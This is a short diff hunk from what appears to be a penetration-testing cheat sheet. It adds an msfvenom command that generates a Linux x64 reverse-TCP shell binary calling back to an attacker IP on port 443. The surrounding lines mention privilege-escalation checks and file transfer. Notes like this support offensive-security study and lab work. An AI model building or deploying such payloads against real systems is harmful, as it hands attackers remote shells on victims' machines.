@@ -150,6 +150,10 @@ if SeImpersonatePrivilege is enabled, then the host is likely vulnerable to rott
 
 `msfvenom -l payload | grep php`
 
+msfvenom linux binary
+
+`msfvenom -p linux/x64/shell/reverse_tcp LHOST=172.xx.xx.xx LPORT=443 -f elf > shell.elf`
+
 ### moving files
 
 **windows file download**
